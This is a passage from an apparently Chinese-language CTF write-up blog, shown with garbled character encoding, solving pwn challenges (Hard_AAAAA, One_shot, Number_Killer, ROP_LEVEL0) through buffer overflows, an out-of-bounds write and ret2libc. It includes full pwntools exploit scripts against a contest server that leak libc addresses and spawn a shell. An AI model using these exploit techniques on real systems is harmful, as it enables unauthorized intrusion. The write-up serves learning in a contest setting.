class="keyword">if</span> ( !<span class="built_in">memcmp</span>(<span class="string">"0O0o"</span>, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å±é™©å‡½æ•°getsï¼Œæ‰€ä»¥ä¼šæœ‰æº¢å‡ºï¼Œ</p><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå°±æ˜¯ä¼ªä»£ç æ¢å¤æ¥çš„éœ€è¦æ¯”è¾ƒçš„å­—ç¬¦åªæœ‰0O0oï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°åˆè¦æ¯”è¾ƒ7ä¸ªå­—ç¬¦ï¼Œ</p><p>æˆ‘ä»¬ç›´æ¥å».rodataæ®µçœ‹</p><p>è¿˜æ˜¯åªæœ‰å…­ä¸ªå­—ç¬¦ï¼Œï¼Œemmmï¼Œé‚£å°±æŒ‰Dï¼Œè½¬Data</p><p>è¿™è¦å°±çŸ¥é“ä¸ºå•¥åç¼–è¯‘ä¹‹ååªç»™äº†4ä¸ªå­—ç¬¦äº†ï¼Œå› ä¸ºå½“ä¸­æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æˆªæ–­ç¬¦å·ï¼Œ\x00ï¼Œ</p><p>æ‰€ä»¥çœŸæ­£è¦æ¯”è¾ƒçš„å­—ç¬¦ä¸²å°±æ˜¯0O0o\x00O0</p><p>ç„¶åå†çœ‹è¦è¢«æ¯”è¾ƒçš„å­—ç¬¦ä¸²v5çš„èµ·å§‹åœ°å€</p><p>æ¥å—æˆ‘ä»¬è¾“å…¥çš„åœ°å€æ˜¯&amp;s</p><p>æ‰€ä»¥ä¸­é—´çš„å¡«å……å­—ç¬¦çš„æ•°é‡å°±æ˜¯0xAC-0x31</p><p>ç”»ä¸ªå›¾å°±æ˜¯</p><p><img src="https://i.loli.net/2020/04/30/tpTBCkHQNwmiSsO.png" alt="img"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"Hard_AAAAA"</span>)</span><br><span class="line"></span><br><span class="line">def pwn(url,port,debug):</span><br><span class="line">    <span class="keyword">if</span> (<span class="attr">debug==1):</span></span><br><span class="line">        <span class="attr">sh</span> = process('./Hard_AAAAA')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="attr">sh</span> = remote(url,port)</span><br><span class="line">    sh.recvuntil(<span class="string">"Let's 0O0o\\0O0!\n"</span>)</span><br><span class="line">    <span class="attr">payload</span> = <span class="string">"a"</span>* (<span class="number">0</span>xAC-<span class="number">0</span>x31)</span><br><span class="line">    payload+=<span class="string">"0O0o\x00O0"</span></span><br><span class="line">   <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">   <span class="comment"># pause()</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20000"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="One-shot"><a href="#One-shot" class="headerlink" title="One_shot"></a>One_shot</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-5"><a href="#é¢˜ç›®ä»‹ç»ï¼š-5" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ä¸€å‘å…¥é­‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š-5"><a href="#è§£é¢˜æ€è·¯ï¼š-5" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„nameå¯ä»¥è¾“å‡º32ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬çœ‹çœ‹æ ˆé‡Œçš„å¸ƒç½®</p><p><img src="https://i.loli.net/2020/04/30/oQhTVYBbSUEfNX9.png" alt="img"></p><p>å¯ä»¥å‘ç°ï¼Œ0xE0-0xC0 åˆšå¥½ç­‰äº32</p><p>æ‰€ä»¥ï¼Œè¾“å…¥32ä¸ªå­—èŠ‚é•¿çš„nameåï¼ŒæŒ‰ç†è¯´nameå’Œflagå°±æ‹¼æ¥åœ¨ä¸€èµ·äº†ï¼Œ</p><p>ä½†æ˜¯å­—ç¬¦ä¸²ä¼šåœ¨æœ€ååŠ ä¸€ä¸ªæˆªæ–­ç¬¦\x00,æ‰€ä»¥ä¹Ÿå°±æ˜¯flagçš„ç¬¬ä¸€ä½ä¼šè¢«æˆªæ–­ç¬¦ç»™è¦†ç›–</p><p>è¿™é‡Œç¨‹åºè´´å¿ƒçš„ç»™äº†ä¸€ä¸ªä¿®æ”¹æŒ‡å®šåœ°å€çš„å€¼ä¸º1çš„åŠŸèƒ½</p><p>æ‰€ä»¥æˆ‘ä»¬è¾“å…¥åœ°å€ï¼š00000000006010E0ï¼ŒæŠŠè¿™ä¸ªæˆªæ–­ç¬¦ç»™æ”¹äº†ï¼Œ</p><p>é‚£ä¹ˆç¨‹åºæœ‰ä¸€ä¸ªè¾“å‡ºnameçš„åŠŸèƒ½ï¼Œè¾“å‡ºnameæ—¶ï¼Œç”±äºnameå’Œflagå·²ç»æ‹¼æ¥åœ¨ä¸€èµ·äº†ï¼Œå°±ä¼šè¿ç€flagä¸€èµ·è¾“å‡ºå‡ºæ¥ï¼Œå½“ç„¶ï¼Œflagçš„ç¬¬ä¸€ä½å·²ç»è¢«æ•°å­—1ç»™è¦†ç›–äº†ï¼Œä½†æ˜¯ä¸è¦ç´§ï¼Œæ˜¾ç„¶flagçš„ç¬¬ä¸€ä½å°±æ˜¯â€™hâ€™</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"One_Shot"</span>)</span><br><span class="line"></span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./One_Shot'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"name?\n"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>* <span class="number">32</span></span><br><span class="line">    <span class="keyword">sh</span>.send(payload)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"shot!\n"</span>)</span><br><span class="line">    addr = <span class="keyword">int</span>(<span class="string">"0x6010E0"</span>,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(addr))</span><br><span class="line">    flag=<span class="keyword">sh</span>.recv()</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line">   # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">   # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20002"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-6"><a href="#é¢˜ç›®ä»‹ç»ï¼š-6" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>çœ‹èµ·æ¥äººç•œæ— å®³çš„ä¸€äº›æ•´æ•°ä¹Ÿèƒ½ç§’æˆ‘ï¼Ÿ(åƒæƒŠ)<br>nc 47.103.214.163 20001</p><h4 id="è§£é¢˜æ€è·¯ï¼š-6"><a href="#è§£é¢˜æ€è·¯ï¼š-6" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>readå‡½æ•°çš„åŠŸèƒ½å°±æ˜¯è¯»å…¥ï¼Œè¿”å›20ä¸ªæ•°å­—</p><p>è¿™é‡Œ20ä¸ªæ•°å­—æœ€å¤šå 8å­—èŠ‚</p><p>å¹¶ä¸”æ•°ç»„çš„å®šä¹‰æ˜¯__int64ï¼Œ64ä½ä¸‹ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ å°±å 8ä¸ªå­—èŠ‚äº†ã€‚</p><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œæ•°ç»„v4æœ€å¤šå¯ä»¥å­˜11ä¸ªæ•°å­—ï¼Œä½†æ˜¯åœ¨å¾ªç¯è¯»å…¥çš„æ—¶å€™å´è¯»äº†20ä¸ªæ•°ï¼Œè¿™é‡Œæ˜¾ç„¶æœ‰æ•°ç»„è¶Šç•Œã€‚</p><p>æˆ‘ä»¬åœ¨çœ‹ä¸€ä¸‹æ ˆ</p><p><img src="https://i.loli.net/2020/04/30/51KHsVeqZRjotS8.png" alt="img"></p><p>æ•°ç»„çš„åœ°å€æ—¶ï¼Œ-60åˆ°-08ï¼Œè¿™ä¸ªvar_4æ˜¯içš„åœ°å€ã€‚</p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨è¯»å…¥20ä¸ªæ•°æ®çš„æ—¶å€™ï¼Œæ•°ç»„ä¼šè¶Šç•Œï¼Œå¹¶ä¸”è¿˜ä¼šè¦†ç›–i çš„å€¼ã€‚</p><p>ç”±äºç¨‹åºä¸­æ˜¯æ ¹æ®iå¾—å€¼æ¥ç®—åœ°å€ï¼Œæ¥å†™å…¥æˆ‘ä»¬å¾—è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ§åˆ¶içš„å€¼ã€‚</p><p>æŠ›å¼€è¿™äº›ä¸è¯´ï¼Œè¶Šç•Œäº†ä¹‹ååˆèƒ½å¹²ä»€ä¹ˆå‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸€ç§ret2libcçš„åˆ©ç”¨æ–¹å¼</p><p>å‚è€ƒè¿™ç¯‡<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">æ–‡ç« </a></p><p>æº¢å‡ºåæˆ‘ä»¬å…ˆåˆ©ç”¨Ropgadget æ‰¾åˆ° pop edi;ret çš„åœ°å€ï¼Œç„¶ååˆ©ç”¨libcé‡Œçš„systemå‡½æ•°ï¼Œ/bin/shå­—ç¬¦ä¸²æ¥getshell</p><p>åŸç†åœ¨ä¸Šé¢çš„æ–‡ç« è®²çš„æ¯”è¾ƒæ¸…æ¥šã€‚è¿™é‡Œä»‹ç»å…·ä½“æ“ä½œï¼š</p><p>åˆ©ç”¨Ropgadget æ‰¾åˆ° pop edi;ret çš„åœ°å€</p><p>ç„¶åçœ‹çœ‹ç¨‹åºçš„libcçš„ç‰ˆæœ¬</p><p><img src="https://i.loli.net/2020/04/30/kfPgrNQFXHmcYlp.png" alt="img"></p><p>ï¼ˆæ‰“è¿œç¨‹çš„æ—¶å€™è¿˜å¾—çŸ¥é“è¿œç¨‹ç¯å¢ƒçš„ubuntuç‰ˆæœ¬ï¼Œ16.04ï¼Œ18.04è¿˜æ˜¯ä¸çŸ¥é“çš„ï¼Œä½†æ˜¯ï¼Œå…¶å®æœ‰libcsearcherè¿™æ ·çš„ç¥å™¨ï¼Œä¹Ÿæœ‰åœ¨çº¿æŸ¥çš„ç½‘ç«™ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ï¼‰</p><p>ç„¶åæˆ‘ä»¬å…ˆæ³„éœ²ä¸€ä¸‹ç¨‹åºé‡Œlibcçš„æŸå‡½æ•°çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹ æƒ¯æ€§æ‰¾â€˜__libc_start_mainâ€™è¿™ä¸ªå‡½æ•°ï¼Œ</p><p>æ€ä¹ˆæ³„éœ²ï¼Ÿåˆ©ç”¨ä¹‹å‰æ‰¾åˆ°çš„pop edi;retï¼Œè·³åˆ°puts@plté‚£å»ï¼Œè¿™ä¸ªå‡½æ•°çš„åœ°å€æ€ä¹ˆæ‰¾</p><p><img src="https://i.loli.net/2020/04/30/LlpuXSwFjD94mA1.png" alt="img"></p><p>puts çš„å‚æ•°å³æŒ‡å‘â€˜__libc_start_mainâ€™çš„æŒ‡é’ˆçš„åœ°å€è¿™ä¹ˆæ‰¾ï¼š</p><p><img src="https://i.loli.net/2020/04/30/hgAE57Ue9NJPaGT.png" alt="img"></p><p><img src="upload/image-20200121230334511.png" alt="image-20200121230334511"></p><p><img src="upload/image-20200121230348242.png" alt="image-20200121230348242"></p><p>å›¾ä¸­çš„0000000000601030ï¼Œ</p><p>æ‰“è¿‡å»åæˆ‘ä»¬ä¼šæ”¶åˆ°â€˜__libc_start_mainâ€™å‡½æ•°çš„åœ°å€ï¼Œå…¶ä¸­åªæœ‰æœ€åä¸‰ä½æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå¼€å¯äº†ASLRï¼Œæ¯ä¸€æ¬¡çš„libcçš„åŸºå€éƒ½æ˜¯éšæœºçš„ï¼ˆä½†æœ€åä¸‰ä½æ€»æ˜¯æœ‰æ•ˆçš„ï¼‰ã€‚</p><p>ALSRå’ŒPIEçš„åŒºåˆ«ï¼š</p><p>ç®€å•æ¥è¯´ï¼Œå¼€å¯äº†ALSRï¼Œå †ã€æ ˆã€libcçš„åœ°å€ä¼šå‘ç”Ÿå˜åŒ–</p><p>å¼€å¯äº†ALSRååˆå¼€å¯äº†PIEï¼Œåˆ™ä»£ç æ®µå’Œæ•°æ®æ®µçš„åœ°å€ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–</p><p><img src="https://i.loli.net/2020/04/30/4ZiBMCbnfOKHDxu.png" alt="img"></p><p>æˆ‘ä»¬æ‹¿åˆ°è¿™åä¸‰ä½åœ°å€å» <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a> æŸ¥</p><p><img src="https://i.loli.net/2020/04/30/VJclnhgNt9KwLso.png" alt="img"></p><p>æœ‰ä¸‰ä¸ªç»“æœï¼Œä¸€ä¸ªä¸ªè¯•è¿‡æ¥å¥½äº†ï¼Œæœ€åå‘ç°å‰ä¸¤ä¸ªç‰ˆæœ¬éƒ½æ˜¯å¯ä»¥çš„</p><p>å®ƒå·²ç»åˆ—å¥½äº†æˆ‘ä»¬éœ€è¦çš„å‡½æ•°å’Œå­—ç¬¦ä¸²ä¸æˆ‘ä»¬æ³„éœ²çš„é‚£ä¸ªå‡½æ•°åœ°å€çš„ç›¸å¯¹åç§»äº†</p><p>æˆ‘ä»¬ç›´æ¥åŠ ä¸Šå»å°±å¥½ã€‚å³</p><p>system_addr = leak_value + 0x24c50<br>s_addr = leak_value + 0x16c617</p><p>ï¼ˆå…¶å®æ‰¾put@pltå’ŒæŒ‡å‘å‡½æ•°â€˜__libc_start_mainâ€˜çš„æŒ‡é’ˆçš„åœ°å€æœ‰ä¸€ç§æ›´æ–¹ä¾¿çš„æ–¹æ³•ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"Number_Killer"</span>)</span><br><span class="line"></span><br><span class="line">elf<span class="selector-class">.symbols</span>[<span class="string">'puts'</span>] <span class="comment">//è¿”å›.textæ®µæˆ–è€….pltæ®µçš„å‡½æ•°åœ°å€</span></span><br><span class="line">elf<span class="selector-class">.got</span>[<span class="string">'__libc_start_main'</span>]<span class="comment">//è¿”å›gotè¡¨ä¸­å‡½æ•°æŒ‡é’ˆçš„åœ°å€</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬leakäº†libcçš„åœ°å€äº†ï¼Œæˆ‘ä»¬è¿˜è¦å›åˆ°ä¸»å‡½æ•°ï¼Œå†åˆ©ç”¨ä¸€æ¬¡æ¼æ´æ¥getshellï¼Œæ‰€ä»¥putsçš„è¿”å›åœ°å€æ˜¯</p><p>elf.symbols[â€˜mainâ€™]</p><p>å‰é¢è°ˆåˆ°ï¼Œiçš„å€¼ä¼šè¢«è¦†ç›–æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ³¨æ„æ§åˆ¶içš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨èµ°å®Œ11æ¬¡ä¹‹åï¼Œ</p><p>æˆ‘ä»¬ä¸€å…±å¡«æ»¡äº†88(0x58)ä¸ªå­—èŠ‚ï¼Œè·ç¦»iä¸­é—´è¿˜æœ‰4ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œäºæ˜¯æˆ‘ä»¬å¡«å››ä¸ªå­—èŠ‚çš„ffï¼Œç„¶åå¡«ä¸€ä¸ªæ•°ï¼Œå°±ä»£è¡¨içš„å€¼äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥è®©i=c,å› ä¸ºæ¥ä¸‹æ¥æˆ‘ä»¬è¦å‘é€gadgetçš„åœ°å€ï¼Œputs@pltçš„åœ°å€ï¼Œputs@pltçš„å‚æ•°ï¼Œputs@pltçš„è¿”å›åœ°å€ï¼ˆmainï¼‰ï¼Œi=cï¼Œæ­¤æ—¶åˆšå¥½å†™å…¥åœ°å€å°±åˆšå¥½æŒ‡å‘è¿”å›åœ°å€ã€‚</p><p>ç„¶åè®©ièµ°åˆ°19ï¼Œæ­¤æ—¶ç¨‹åºæ‰ä¼šè·³å‡ºå¾ªç¯ï¼Œå‡½æ•°æ‰ä¼šè¿”å›ï¼Œä¹Ÿå°±æ˜¯è·³åˆ°æˆ‘ä»¬å¾—puts@pltï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹åè¿˜è¦è¿›è¡Œå¡«å……ã€‚</p><p>ã€æ³¨ï¼Œ64ä½ç¨‹åºé€šè¿‡å¯„å­˜å™¨ä¼ å€¼ï¼Œæ‰€ä»¥æ˜¯pop rdiï¼›ret   å‡½æ•°å‚æ•°   å‡½æ•°åœ°å€   å‡½æ•°è¿”å›åœ°å€    è¿™æ ·çš„é¡ºåºï¼›</p><p>å¦‚æœæ˜¯32ä½ç¨‹åºï¼Œå°±ä¸ç”¨pop rdiï¼›retäº†ï¼Œç›´æ¥å¯ä»¥ä¼ ï¼šå‡½æ•°åœ°å€ å‡½æ•°è¿”å›åœ°å€ å‡½æ•°å‚æ•°ã€‘</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"Number_Killer"</span>)</span><br><span class="line">#libc =</span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./Number_Killer'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"numbers!\n"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xffffffffffffffff)) #å¡«å……æ•°ç»„</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xcffffffff))#å°ç«¯åºï¼Œåå››ä¸ªå­—èŠ‚ç”¨æ¥å¡«å……ï¼Œ<span class="keyword">c</span>æ˜¯içš„å€¼</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>x400803))#ROPgadget --binary ./pwnme --<span class="keyword">only</span> <span class="string">"pop|ret"</span> | <span class="keyword">grep</span> <span class="string">'rdi'</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.got[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.symbols[<span class="string">'main'</span>]))</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">         <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xdeadbeef))#å¡«å……ï¼Œè®©å¾ªç¯èµ°å®Œ</span><br><span class="line"></span><br><span class="line">    leak_value = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"leak_value %s"</span>%hex(leak_value))</span><br><span class="line">    #libc_base = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">    system_addr = leak_value + <span class="number">0</span>x24c50#åé¢çš„ç›¸å¯¹åç§»å°±æ˜¯ç½‘ç«™æŸ¥è¯¢å¾—æ¥çš„</span><br><span class="line">    sh_addr = leak_value + <span class="number">0</span>x16c617</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"numbers!\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xffffffffffffffff))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xcffffffff))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>x400803))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(sh_addr))#systemçš„å‚æ•°ï¼Œ<span class="string">'/bin/sh'</span>çš„åœ°å€</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(system_addr))#systemå‡½æ•°çš„åœ°å€ï¼ˆè¿™ä¸¤ä¸ªéƒ½æ˜¯libcé‡Œå¤´çš„ï¼‰</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xdeadbeef))#å¡«å……ï¼Œè®©å¾ªç¯èµ°å®Œ</span><br><span class="line">        </span><br><span class="line">    # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">    # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20001"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-7"><a href="#é¢˜ç›®ä»‹ç»ï¼š-7" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ROP is PWNersâ€™ romance<br>nc 47.103.214.163 20003</p><h4 id="è§£é¢˜æ€è·¯ï¼š-7"><a href="#è§£é¢˜æ€è·¯ï¼š-7" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>é¢„æœŸè§£åº”è¯¥æ˜¯æº¢å‡ºç„¶åå†™shellcodeåˆ©ç”¨orwå¾—åˆ°è¯»flagï¼Œä½†æ˜¯ï¼ŒROP is PWNersâ€™ romanceï¼Œ</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘åˆ©ç”¨çš„è¿˜æ˜¯ä¸Šä¸€é¢˜çš„ret2libcï¼Œåº”è¯¥æ˜¯éé¢„æœŸäº†ã€‚</p><p>é¦–å…ˆè¿™é‡Œä¼šè¯»0x100ä¸ªå­—ç¬¦è¿›v5ï¼Œä½†æ˜¯v5åœ¨æ ˆé‡Œçš„ä½ç½®</p><p>è·ç¦»æ ˆåº•æŒ‡é’ˆåªæœ‰0x50ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œè‚¯å®šæ˜¯å­˜åœ¨æ ˆæº¢å‡ºçš„ï¼Œç„¶åå¦‚ä¸Šé¢˜ä¸€æ ·çš„æ“ä½œï¼ˆå‡ºé¢˜äººå‡ºé¢˜ç”¨çš„åŒä¸€ä¸ªç¯å¢ƒï¼Œæ‰€ä»¥è„šæœ¬å‡ ä¹å¯ä»¥ç›´æ¥æ¬æ¥ï¼‰</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"ROP_LEVEL0"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./ROP_LEVEL0'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"./flag\n"</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="string">'a'</span>*(<span class="number">88</span>)</span><br><span class="line">    payload=buf+p64(<span class="number">0</span>x400753)#ROPgadget --binary ./pwnme --<span class="keyword">only</span> <span class="string">"pop|ret"</span> | <span class="keyword">grep</span> <span class="string">'rdi'</span></span><br><span class="line">    </span><br><span class="line">    payload+=p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">    payload+=p64(elf.symbols[<span class="string">'puts'</span>])</span><br><span class="line">    payload+=p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">    <span class="keyword">sh</span>.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    leak_value = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span 